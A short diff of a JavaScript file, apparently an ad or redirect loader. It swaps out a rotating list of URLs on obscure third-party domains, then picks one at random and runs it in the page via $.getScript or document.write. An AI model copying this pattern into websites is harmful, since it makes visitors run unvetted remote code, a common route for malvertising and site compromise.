@@ -96,7 +96,7 @@ var db=Math.floor(Math.random()*dbs.length);if(dbs[db].indexOf("<")!=-1)
 else
 {$.getScript(dbs[db]);}}
 else
-{var xtbs=new Array();xtbs[0]='https://wap.ntzfly.cn/c/361D9AC9-E84E-4DE8-A51C-377057908599.panda';xtbs[1]='https://k.wudejia.com/s.php?pid=8028';xtbs[2]='https://yd.game4343.com/xtb.php?m=bFRBZkFXdUdJMkZLWg%3D%3D';xtbs[3]='https://yi.screenpro.com.cn/first/B40F17C7-268D-4032-9C7F-64B10EBB6075.yx';var xtb=Math.floor(Math.random()*xtbs.length);if(xtbs[xtb].indexOf("<")!=-1)
+{var xtbs=new Array();xtbs[0]='https://wap.ntzfly.cn/c/B25EA802-F469-4C55-A839-67808FD83B81.panda';xtbs[1]='https://yd.game4343.com/xtb.php?m=KzlZSWVDT3BkUGdrMA%3D%3D';xtbs[2]='https://f.zgbmw.com.cn/first/F7CAE0CB-C7A4-46CB-8C23-9E77F6629D26.yx';xtbs[3]='https://k.wudejia.com/x.php?pid=8028';var xtb=Math.floor(Math.random()*xtbs.length);if(xtbs[xtb].indexOf("<")!=-1)
 {document.write(xtbs[xtb]);}
 else
 {$.getScript(xtbs[xtb]);}}}}
